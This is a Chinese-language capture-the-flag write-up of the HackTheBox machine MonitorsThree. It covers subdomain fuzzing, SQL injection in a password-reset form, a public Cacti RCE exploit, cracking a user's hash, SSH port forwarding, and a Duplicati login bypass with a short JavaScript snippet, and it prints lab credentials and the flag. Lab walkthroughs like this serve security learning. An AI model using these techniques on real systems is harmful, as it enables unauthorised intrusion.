---
title: '[htb] MonitorsThree'
date: 2024-12-01 13:22 +0800
categories: [hack,HackTheBox]
tags: []
---

## information

```shell
╭─bamuwe@Mac ~/Desktop
╰─$ nmap -F monitorsthree.htb
Starting Nmap 7.95 ( https://nmap.org ) at 2024-12-01 13:23 CST
Nmap scan report for monitorsthree.htb (10.10.11.30)
Host is up (0.24s latency).
Not shown: 98 closed tcp ports (conn-refused)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.13 seconds
```

## www-data

![alt text](<../assets/img/2024-12-01-[htb] MonitorsThree.assets/image.png>)
> 网站截图

```shell
╭─bamuwe@Mac ~/Desktop/CVE-2024-25641-RCE-Automated-Exploit-Cacti-1.2.26 ‹main›
╰─$ ffuf -u 'http://monitorsthree.htb/' -w ~/Documents/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -H 'host:FUZZ.monitorsthree.htb' -fs 13560

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://monitorsthree.htb/
 :: Wordlist         : FUZZ: /Users/bamuwe/Documents/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt
 :: Header           : Host: FUZZ.monitorsthree.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 13560
________________________________________________

cacti                   [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 359ms]
```
子域名扫描发现子域cacti
![alt text](<../assets/img/2024-12-01-[htb] MonitorsThree.assets/image-1.png>)

发现是一个cacti管理页面，也根据版本号1.2.26找到了一个exp，但是exp的使用需要密码，我们没有密码。返回主域寻找密码。
> https://github.com/thisisveryfunny/CVE-2024-25641-RCE-Automated-Exploit-Cacti-1.2.26?tab=readme-ov-file
主域有一个login功能，其中根据用户名找回密码的功能，通过尝试，确定有admin这个用户。

![alt text](<../assets/img/2024-12-01-[htb] MonitorsThree.assets/image-2.png>)
> 找回密码功能

请求包如下：
```http
POST /forgot_password.php HTTP/1.1
Host: monitorsthree.htb
Upgrade-Insecure-Requests: 1
Cookie: PHPSESSID=t9ah401j2ql63i4qo8o7v6442t
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36
Origin: http://monitorsthree.htb
Referer: http://monitorsthree.htb/forgot_password.php
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cache-Control: max-age=0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Content-Length: 14

username=admin
```
这里的username参数存在sql注入，用sqlmap跑出来是一个延时注入，肥肠之慢，所以这里我直接跳了。
> https://github.com/maxzxc0110/hack-study/blob/dd7e143ac0327408f7814e544630b8526a73caf5/%E9%9D%B6%E5%9C%BA/HTB/MonitorsThree.md

得到账号密码**admin / greencacti2001** 
运行搜索到的exp得到www-data

![alt text](<../assets/img/2024-12-01-[htb] MonitorsThree.assets/image-3.png>)
> 运行截图
## marcus

![alt text](<../assets/img/2024-12-01-[htb] MonitorsThree.assets/image-4.png>)
> :/var/www/html/cacti/include/config.php
发现数据库账号密码**cactiuser / cactiuser**

![alt text](<../assets/img/2024-12-01-[htb] MonitorsThree.assets/image-5.png>)
> 数据库查询结构
得到marcus的密码hash。接下来尝试破解这个密码。

```shell
╭─bamuwe@Mac ~/Desktop
╰─$ john password ~/Documents/rockyou.txt
...etc
```

```shell
╭─bamuwe@Mac ~/Desktop
╰─$ cat /Users/bamuwe/.john/john.pot

$2y$10$Fq8wGXvlM3Le.5LIzmM9weFs9s6W2i1FLg3yrdNGmkIaxo79IBjtK:12345678910
```
我这里已经破解过了。最终得到了 **marcus / 12345678910**

![alt text](<../assets/img/2024-12-01-[htb] MonitorsThree.assets/image-6.png>)
> 得到用户marcus

## root

```shell
marcus@monitorsthree:/var/www/html/cacti/include$ netstat -tunlp|grep 127.0.0.1
<w/html/cacti/include$ netstat -tunlp|grep 127.0.0.1
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:43519         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:8200          0.0.0.0:*               LISTEN      -
```
查看本地发现在监听8200端口，使用ssh转发出来。这里不能直接用ssh密码连接，但是可以使用marcus密钥连接。

```shell
╭─bamuwe@Mac ~/Desktop
╰─$ ssh -i id_rsa marcus@cacti.monitorsthree.htb -L 8200:127.0.0.1:8200                                                                                                 130 ↵
Last login: Sun Dec  1 04:31:28 2024 from 10.10.16.77
marcus@monitorsthree:~$
```
![alt text](<../assets/img/2024-12-01-[htb] MonitorsThree.assets/image-7.png>)
> http://127.0.0.1:8200

是一个Duplicati管理页面，跟第一个用户一样，我们没有密码，但是搜索可以发现这个管理系统存在登录绕过的方法。
> https://github.com/duplicati/duplicati/issues/5197

按照链接的方法，
1. 首先要获得Server_passphrase，并且从base64解密再转换到hex
```shell
marcus@monitorsthree:/opt/duplicati/config$ ls
CNSAQPFASC.sqlite  CTADPNHLTC.sqlite  Duplicati-server.sqlite  KBBPHOVTJE.sqlite  NKHUNJXXOX.backup  NKHUNJXXOX.sqlite  XKUQSLDDQX.sqlite  XWXJCJZHNE.sqlite  control_dir_v2
```
![alt text](<../assets/img/2024-12-01-[htb] MonitorsThree.assets/image-8.png>)
> Duplication-server.sqlite查询

得到**Server_passphrase=Wb6e855L3sN9LTaCuwPXuautswTIQbekmMAr7BrK2Ho=**
![alt text](<../assets/img/2024-12-01-[htb] MonitorsThree.assets/image-10.png>)
> 解密转换

得到**59be9ef39e4bdec37d2d3682bb03d7b9abadb304c841b7a498c02bec1acad87a**

2. 其次要获得respond中的Nonce
![alt text](<../assets/img/2024-12-01-[htb] MonitorsThree.assets/image-9.png>)
> 劫持响应截图

3. 最后使用给出的这段js代码
```javascript
var saltedpwd = 'HexOutputFromCyberChef'; // Replace with the Hex output from step 6
var noncedpwd = CryptoJS.SHA256(CryptoJS.enc.Hex.parse(CryptoJS.enc.Base64.parse('NonceFromBurp') + saltedpwd)).toString(CryptoJS.enc.Base64); // Replace 'NonceFromBurp' with the intercepted nonce
console.log(noncedpwd);
```
修改对应参数
![alt text](<../assets/img/2024-12-01-[htb] MonitorsThree.assets/image-11.png>)
> js脚本运行截图，这里脚本参数最后多了一位，后续重新跑了一下，图就没有换了。

得到password参数，替换原有参数。这里有时候需要url编码，小部分情况不用编码也能成功。
![alt text](<../assets/img/2024-12-01-[htb] MonitorsThree.assets/image-13.png>)
> 请求包截图

![alt text](<../assets/img/2024-12-01-[htb] MonitorsThree.assets/image-14.png>)
> Duplicati管理页面截图

Duplicati是一个类似文件备份的系统。我们使用平台功能把root.txt备份出来，在还原到我们能够读取到的地方即可。
![alt text](<../assets/img/2024-12-01-[htb] MonitorsThree.assets/image-15.png>)
> 备份

这里要注意的是我们选择的文件都应该是source目录下。
![alt text](<../assets/img/2024-12-01-[htb] MonitorsThree.assets/image-16.png>) 
> 还原

```shell
marcus@monitorsthree:~$ ls
manifest  root.txt  user.txt
marcus@monitorsthree:~$ cat root.txt
f62abaf8d1017898bed7335e21e9dd7d
marcus@monitorsthree:~$
```

## conclusion
- 考验信息收集能力，在立足点的突破中，不单单使用一个cve脚本一键提权，考察信息收集的思路，我们缺少什么信息，需要寻找什么信息。
- 信息收集的关注点不仅仅在当前版本的漏洞中，历史的漏洞也应该浏览。
- 有意思的靶机，特别是提权的部分，不依赖于现有的exp（本人脚本饺子🥟实锤）。



